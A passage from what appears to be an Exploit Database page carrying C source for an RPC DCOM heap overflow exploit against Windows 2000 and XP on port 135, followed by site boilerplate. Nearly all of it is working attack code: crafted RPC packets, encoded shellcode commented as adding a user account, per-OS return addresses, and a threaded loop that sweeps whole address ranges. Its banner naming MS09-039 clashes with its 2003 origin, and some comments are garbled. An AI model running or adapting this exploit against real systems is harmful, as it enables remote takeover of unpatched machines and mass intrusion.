07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x46,0x00,0x43,0x00,0x24,0x00,0x46,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};void XOR(unsigned char *buf,int offset,int lenght,unsigned char mask){for(int i=offset;i<(offset+lenght);i++)buf[i]=buf[i]^mask;}DWORD GETSTRCS(char *buf){DWORD cs=0;bool cld=false;for(unsigned int i=0;i<strlen(buf);i++){for(int z=0;z<13;z++){if(cs&1) cld=true;cs=cs>>1;if(cld) cs=cs|0x80000000;cld=false;}cs+=buf[i];}return cs;}struct {DWORD seh;DWORD jmp;DWORD heap;char target[200];} target_os[]={{0x005Bfd2c,0x00081eeb,0x00180000,"WinXP"},{0x0095fd3c,0x00081eeb,0x00170000,"Win2K"}},v;unsigned char rawData1[]="\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x68\x00""\x6F\x00\x73\x00\x74\x00\x5C\x00\x43\x00\x24\x00\x5C\x00""\x58\x00\xeb\x3c\x46\x00\x46\x00\xeb\x7c\x46\x00\x46\x00\x38\x6e""\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""\xeb\x1e\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xeb\x06\xf1\xe1\xf2\xe1\xea\xd2"//SHELLCODE From SAM ,THANKs !//Add user SST,password is 557,"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x4D\x01\x80\x34\x0A\x99\xE2\xFA""\xEB\x05\xE8\xEB\xFF\xFF\xFF""\x70\xDA\x98\x99\x99\xCC\x12\x75\x18\x75\x19\x99\x99\x99\x12\x6D""\x71\x92\x98\x99\x99\x10\x9F\x66\xAF\xF1\x01\x67\x13\x97\x71\x3C""\x99\x99\x99\x10\xDF\x95\x66\xAF\xF1\xE7\x41\x7B\xEA\x71\x0F\x99""\x99\x99\x10\xDF\x89\xFD\x38\x81\x99\x99\x99\x12\xD9\xA9\x14\xD9""\x81\x22\x99\x99\x8E\x99\x10\x81\xAA\x59\xC9\xF3\xFD\xF1\xB9\xB6""\xF8\xFD\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED""\xB9\x12\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xB9\xAC\xAC\xAE""\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED\xB9\x12""\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xFD\xFD\x99\x99\xF1\xED""\xB9\xB6\xF8\xF1\xEA\xB9\xEA\xEA\xF1\xF8\xED\xF6\xEB\xF1\xF0\xEA""\xED\xEB\xF1\xFD\xF4\xF0\xF7\xF1\xEC\xE9\xB9\xF8\xF1\xF5\xFE\xEB""\xF6\xF1\xF5\xF6\xFA\xF8\xF1\xF7\xFC\xED\xB9\x12\x55\xC9\xC8\x66""\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81""\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A""\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3""\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78""\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D""\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99""\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12""\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99""\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\x21\x67\x66\x66""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""\x7f\x19\x95\xd5\x17\x53\xe6\x6a""\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90\x90" //"\x90\x90\x90\x90\x90\x90\x90\x90""\x77\xe0\x43\x00\x00\x10\x5c\x00""\xeb\x1e\x01\x00"// FOR CN SP3/SP4+-MS03-26"\x4C\x14\xec\x77"// TOP SEH FOR cn w2k+SP4,must modify to SEH of your target's os//FILL BYTE,so sizeof(UNC)>0X400(0X80*8),why? You can read more form my artic//"Utilization of released heap structure and exploit of universal Heap overflow in windows "."\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x90\x02\x80\x34\x0A\x99\xE2\xFA""\xEB\x05\xE8\xEB\xFF\xFF\xFF""\xC7\x5F\x9D\xBD\xDD\x14\xDD\xBD\xDD\xC9\x14\xDD\xBD\x9D\xC9\x14""\x1D\xBD\x1D\x99\x99\x99\xC9\x14\x1D\xBD\x0D\x99\x99\x99\xC9\xAA""\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\x2D\x99\x99\x99\xC9\x66\xCF""\x95\x14\xD5\xBD\xDD\x14\x8D\xBD\xAA\x59\xC9\xF1\xAC\x99\xAE\x99""\xF1\xB9\x99\xAC\x99\xF1\xEA\x99\xED\x99\xF1\xB9\x99\xEA\x99\xF1""\xFC\x99\xEB\x99\xF1\xEC\x99\xEA\x99\xF1\xED\x99\xB9\x99\xF1\xF7""\x99\xFC\x99\x12\x45\xC8\xCB\xC8\xCB\x14\x1D\xBD\x29\x99\x99\x99""\xC9\x14\x1D\xBD\x59\x99\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA""\x14\x1D\xBD\x79\x99\x99\x99\xC9\x66\xCF\x95\xC3\xC0\xAA\x59\xC9""\xF1\xFD\x99\xFD\x99\xF1\xB6\x99\xF8\x99\xF1\xED\x99\xB9\x99\xF1""\xEA\x99\xEA\x99\xF1\xEA\x99\xB9\x99\xF1\xF6\x99\xEB\x99\xF1\xF8""\x99\xED\x99\xF1\xED\x99\xEB\x99\xF1\xF0\x99\xEA\x99\xF1\xF0\x99""\xF7\x99\xF1\xFD\x99\xF4\x99\xF1\xB9\x99\xF8\x99\xF1\xEC\x99\xE9""\x99\xF1\xEB\x99\xF6\x99\xF1\xF5\x99\xFE\x99\xF1\xFA\x99\xF8\x99""\xF1\xF5\x99\xF6\x99\xF1\xED\x99\xB9\x99\xF1\xF7\x99\xFC\x99\x12""\x45\xC8\xCB\x14\x1D\xBD\x61\x99\x99\x99\xC9\x14\x1D\xBD\x91\x98""\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\xB1\x98\x99""\x99\xC9\x66\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12""\xF5\xBD\x81\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12""\xC3\xB9\x9A\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA""\x59\x35\xA3\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD""\x8D\xEC\x78\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A""\x44\x12\x9D\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2""\x5B\x9D\x99\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12""\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\xEC\x64\x66\x66""\x04\x04\x00\x70\x00\x04\x40""\x00\x10\x5c\x00\x78\x01\x07\x00\x78\x01\x07\x00\xa0\x04\x00""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71";int version(char ip[16], int sock){//un poco de ettercap...unsigned char peer0_0[] = {0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00,0xcc, 0x00, 0x00, 0x00, 0x84, 0x67, 0xbe, 0x18,0x31, 0x14, 0x5c, 0x16, 0x00, 0x00, 0x00, 0x00,0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,0xb8, 0x4a, 0x9f, 0x4d, 0x1c, 0x7d, 0xcf, 0x11,0x86, 0x1e, 0x00, 0x20, 0xaf, 0x6e, 0x7c, 0x57,0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a,0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,0x02, 0x00, 0x01, 0x00, 0xa0, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00,0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x00,0x0a, 0x42, 0x24, 0x0a, 0x00, 0x17, 0x21, 0x41,0x2e, 0x48, 0x01, 0x1d, 0x13, 0x0b, 0x04, 0x4d,0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a,0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,0x04, 0x00, 0x01, 0x00, 0xb0, 0x01, 0x52, 0x97,0xca, 0x59, 0xcf, 0x11, 0xa8, 0xd5, 0x00, 0xa0,0xc9, 0x0d, 0x80, 0x51, 0x00, 0x00, 0x00, 0x00,0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,0x02, 0x00, 0x00, 0x00 };unsigned char peer0_1[] = {0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00,0xaa, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x05, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x28, 0x63, 0x29, 0x20,0x75, 0x65, 0x72, 0x84, 0x20, 0x73, 0x73, 0x53,0x20, 0x82, 0x80, 0x67, 0x00, 0x00, 0x00, 0x00,0x80, 0x1d, 0x94, 0x5e, 0x96, 0xbf, 0xcd, 0x11,0xb5, 0x79, 0x08, 0x00, 0x2b, 0x30, 0xbf, 0xeb,0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,0x5c, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x00, 0x00,0x41, 0x00, 0x41, 0x00, 0x5c, 0x00, 0x43, 0x00,0x24, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x2e, 0x00,0x74, 0x00, 0x78, 0x00, 0x74, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00,0x58, 0x73, 0x0b, 0x00, 0x01, 0x00, 0x00, 0x00,0x31, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x07, 0x00 };/*unsigned char win2kvuln[] = {0x04, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00,0x04, 0x5d, 0x88, 0x8a,0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00,0x2b, 0x10, 0x48, 0x60,0x02, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00,0x04, 0x5d, 0x88, 0x8a,0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00,0x2b, 0x10, 0x48, 0x60,0x02, 0x00, 0x00, 0x00};*/fd_set fds2;unsigned char buf[1024];int l;struct timeval tv2;FD_ZERO(&fds2);FD_SET(sock, &fds2);tv2.tv_sec = 6;tv2.tv_usec = 0;memset(buf,'\0',sizeof(buf));send(sock,(char *)peer0_0,sizeof(peer0_0),0);if(select(sock +1, &fds2, NULL, NULL, &tv2) > 0){l=recv (sock, (char *)buf, sizeof (buf),0);// for(i=0;i<52;i++)// {// if (i==28) i=i+4;// if (buf[i+32]!=win2kvuln)// {send(sock,(const char *)peer0_1,sizeof(peer0_1),0);if(select(sock +1, &fds2, NULL, NULL, &tv2) > 0){memset(buf,'\0',sizeof(buf));l=recv (sock, (char *)buf, sizeof (buf),0);if (l==32){closesocket(sock);return(1);//winxp}else{#ifdef WIN32closesocket(sock);#elseclose(sock);#endifreturn(0);//win2kby default. Nt4 not added..}}else return(-1);// }//}// closesocket(sock);// return(0);//win2k}closesocket(sock);return(-1); //Unknown}/********************************************************************************/int attack(char *ip1,bool atack){unsigned char rawData[1036];memcpy(rawData,rawData1,1036);unsigned char shellcode[50000];char ip[200];strcpy(ip,ip1);WSADATA WSAData;SOCKET sock;int len,len1;SOCKADDR_IN addr_in;short port=135;unsigned char buf1[50000];unsigned char buf2[50000];printf("%s\n",ip);//printf("RPC DCOM overflow Vulnerability discoveried by NSFOCUS\n");//printf("Code by FlashSky,Flashsky xfocus org\n");//printf("Welcome to our Site: http://www.xfocus.org\n");//printf("Welcome to our Site: http://www.venustech.com.cn\n");/* if(argc!=3){printf("%s targetIP targetOS\ntargets:\n",argv[0]);for(int i=0;i<sizeof(target_os)/sizeof(v);i++)printf("%d - %s\n",i,target_os.target);printf("\n%x\n",GETSTRCS(argv[1]));return;}*//* if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0){printf("WSAStartup error.Error:%d\n",WSAGetLastError());return;}*/addr_in.sin_family=AF_INET;addr_in.sin_port=htons(port);addr_in.sin_addr.S_un.S_addr=inet_addr(ip);if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET){printf("Socket failed.Error:%d\n",WSAGetLastError());return 0;}len1=sizeof(request1);len=sizeof(rawData);if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR){printf("%s - connect failed\n",ip);return 0;}int vers=!version(ip,sock);// printf("%d\n",vers);// return;// int vers=1;FILE *fp;//ç¨â ¥¬ ¯ ª¥â// fp=fopen("shellcode","rb");// fread(rawData,1,1036,fp);// fclose(fp);//â¥¯¥àì ­ã¦­® ááç¨â âì ­¥¯®áà¥¤áâ¢¥­­® ¨á¯®«­ï¥¬ë© è¥««ª®¤!fp=fopen("bshell2","rb");int sz=fread(shellcode,1,1024,fp);fclose(fp);// printf("%d\n",sz);for(int i=0;i<sz;i++)rawData[i+0x71]=shellcode[i];// fp=fopen("badfile.exe","rb");// unsigned int sz1=fread(shellcode,1,50000,fp);// fclose(fp);// for(i=0;i<sz1;i++)// rawData[i+0x240]=shellcode;// fp=fopen("pac","wb");// fwrite(rawData,1,1036,fp);// fclose(fp);// return;//¥à¥¤ â¥¬ ª ª ªá®à¨âì § ¯¨è¥¬  ¤à¥á á¢®¡®¤­®£® HEAP'a// DWORD heap=0x00180000;// int k=vers;// vers=1;// *(DWORD *)(rawData+0xae)=target_os[vers].heap;*(DWORD *)(rawData+0x71+0x1e)=target_os[vers].heap;//¥¯¥àì ­ã¦­® ¯à®ªá®à¨âì ­ è ª®¤, ¤«ï â®£® çâ®¡ë ¯®«ãç¨âì ­ã¦­ë© ­XOR(rawData,0x71,sz,0x99);// XOR(rawData,0x240,sz1,0x99);// ª ¦¥ ­ ¬ ­ã¦­® § ¯¨á âì ­ã¦­ë© ­ ¬ SEH ¨ JMPDWORD seh=target_os[vers].seh;DWORD jmp=target_os[vers].jmp;*(DWORD *)(rawData+0x22a)=jmp;*(DWORD *)(rawData+0x22e)=seh;// *(WORD *)(rawData+0x62)=sz+sz1+(0x240-(0x71+sz));*(WORD *)(rawData+0x62)=sz;memcpy(buf2,request1,sizeof(request1));*(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(rawData)/2;*(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(rawData)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,rawData,sizeof(rawData));len1=len1+sizeof(rawData);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+len-0xc;*(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+len-0xc;*(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+len-0xc;*(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+len-0xc;*(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+len-0xc;*(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+len-0xc;*(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+len-0xc;*(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+len-0xc;closesocket(sock);if(atack){sock=socket(2,1,0);WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL);if (send(sock,(const char *)bindstr,sizeof(bindstr),0)==SOCKET_ERROR){printf("%s - send failed %d\n",ip,WSAGetLastError());return 0;}else {printf("%s - send exploit to %s\n",ip,target_os[vers].target);}len=recv(sock,(char *)buf1,1000,NULL);bool ft=1;if(ft){int i=0;while(1){if (send(sock,(const char *)buf2,len1,0)==SOCKET_ERROR){printf("\nSend failed.Error:%d\n",WSAGetLastError());return 0;}else{printf("\r%d",++i);}//Sleep(1000);}}send(sock,(const char *)buf2,len1,0);closesocket(sock);}else fprintf(fp1,"%s %s\n",target_os[vers].target,ip);// fp=fopen("pac","wb");// fwrite(rawData,1,1036,fp);// fclose(fp);}unsigned long thread_count=0;char adr[200];DWORD WINAPI ThreadProc(LPVOID lpParameter // thread data){thread_count++;attack(adr,0);thread_count--;return 0;}int main(int argc,char ** argv){//printf("%x %x",OF_READWRITE,GETSTRCS(argv[1]));//return;//HFILE hf=_lopen("asd123",0x1001);//printf("%x",hf);//_lclose(hf);//return;if(argc!=2){fprintf(stderr, "RPC universal exploit. Exploit MS09-039 vulnerability\n""unpatched host - to codee xecution\n""patched host - to DoS\n""based on original XFocus RPCDCOM2 exploit\n""modification and shellcode (c) by karlss0n\n""downloaded on www.k-otik.com\n""\n""usage: %s <target_ip>\n",argv[0]);return 10;}WSADATA wsaData;int wVersionRequested;wVersionRequested = MAKEWORD( 2, 2 );int err = WSAStartup( wVersionRequested, &wsaData );if ( err != 0 ) {/* Tell the user that we could not find a usable *//* WinSock DLL. */return 1;}if(strchr(argv[1],'.')){attack(argv[1],1);Sleep(20000);return 2;}int cb=1,db=1;cb=atoi(argv[3]);db=atoi(argv[4]);long tm=atoi(argv[5]);for(int c=cb;c<255;c++){for(int d=db;d<255;d++){sprintf(adr,"%s.%s.%d.%d",argv[1],argv[2],c,d);if(thread_count>tm) while(thread_count>tm) Sleep(100);CreateThread(NULL,0,&ThreadProc,(void *)"",0,NULL);Sleep(10);fflush(fp1);}}Sleep(60000);fclose(fp1);return 0;}// milw0rm.com [2003-10-09]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit 